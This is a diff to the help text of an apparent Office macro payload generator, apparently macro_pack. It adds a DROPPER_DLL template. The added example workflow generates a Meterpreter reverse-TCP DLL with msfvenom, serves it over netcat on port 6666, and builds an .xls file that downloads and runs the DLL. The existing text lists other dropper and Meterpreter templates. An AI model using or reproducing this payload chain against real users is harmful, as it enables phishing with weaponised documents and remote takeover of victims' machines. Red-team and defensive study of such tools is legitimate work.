@@ -7,7 +7,7 @@ from termcolor import colored
 def printTemplatesUsage(banner, currentApp):
     print(colored(banner, 'green'))
     templatesInfo = \
-"""
+r"""
       == Template usage ==
       
     Templates can be called using  -t, --template=TEMPLATE_NAME combined with other options.
@@ -51,6 +51,20 @@ def printTemplatesUsage(banner, currentApp):
          
                 --------------------  
                 
+        DROPPER_DLL
+        Download a DLL with another extension and run it using Office VBA 
+          -> Example, load meterpreter DLL using Office:  
+        
+        REM Generate meterpreter dll payload
+        msfvenom.bat  -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f dll -o meter.dll
+        REM Make it available on webserver, ex using netcat on port 6666
+        { echo -ne "HTTP/1.0 200 OK\r\n\r\n"; cat meter.dll; } | nc -l -p 6666 -q1
+        REM Create Office file which will download DLL and call it
+        REM The DLL URL is http://192.168.0.5:6666/normal.html and it will be saved as .asd file
+        echo "http://192.168.0.5:6666/normal.html" Run | %s -t DROPPER_DLL -o -G meterdll.xls
+         
+                --------------------  
+                          
         METERPRETER  
         Meterpreter reverse TCP template using MacroMeter by Cn33liz.
         This template is CSharp Meterpreter Stager build by Cn33liz and embedded within VBA using DotNetToJScript from James Forshaw
@@ -78,7 +92,7 @@ def printTemplatesUsage(banner, currentApp):
          -> Example2: echo "path\\to\my_exe.exe" "D:\\another\path\your_exe.exe" | %s  -t EMBED_EXE -o -G my_exe.xlsm
 
                 --------------------  
-""" % (currentApp,currentApp,currentApp,currentApp,currentApp,currentApp,currentApp,currentApp)
+""" % (currentApp,currentApp,currentApp,currentApp,currentApp,currentApp,currentApp,currentApp, currentApp)
     print(templatesInfo)
     
     
@@ -123,7 +137,7 @@ def printUsage(banner, currentApp, mpSession):
         Note that macro_pack will automatically detect AutoOpen, Workbook_Open, or Document_Open  as the start function
         
     -t, --template=TEMPLATE_NAME    Use VBA template already included in %s.
-        Available templates are: HELLO, CMD, DROPPER, DROPPER2, DROPPER_PS, METERPRETER, EMBED_EXE 
+        Available templates are: HELLO, CMD, DROPPER, DROPPER2, DROPPER_PS, DROPPER_DLL, METERPRETER, EMBED_EXE 
         Help for template usage: %s -t help
          
     -G, --generated=OUTPUT_FILE_PATH. Generates a file containing the macro. Will guess the format based on extension.
